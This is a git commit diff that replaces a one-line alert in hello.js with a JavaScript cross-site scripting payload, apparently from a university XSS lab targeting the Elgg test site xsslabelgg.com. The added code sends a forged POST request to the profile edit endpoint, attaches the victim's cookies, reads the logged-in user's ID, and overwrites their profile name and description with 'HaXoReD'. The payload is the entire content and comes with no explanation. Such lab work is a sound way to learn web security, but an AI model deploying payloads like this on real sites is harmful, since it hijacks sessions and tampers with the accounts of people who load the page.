11f68321e9d6e814b5a4d32f67d2b3425f312e2e
Mitch <FSUMitch@users.noreply.github.com>
2017-04-13 13:55:33 -0400

    Update hello.js

--- hello.js
+++ hello.js
@@ -1,1 +1,14 @@
-alert('hello');
+var Ajax=null;
+Ajax=new XMLHttpRequest();
+Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
+Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+Ajax.setRequestHeader("Keep-Alive","300");
+Ajax.setRequestHeader("Connection","keep-alive");
+Ajax.setRequestHeader("Cookie",document.cookie);
+Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+var name="Alice";
+var guid=elgg.get_logged_in_user_guid();
+var description="HaXoReD";
+var content="name="+name+"&description="+description+"&guid="+guid;
+Ajax.send(content);
+
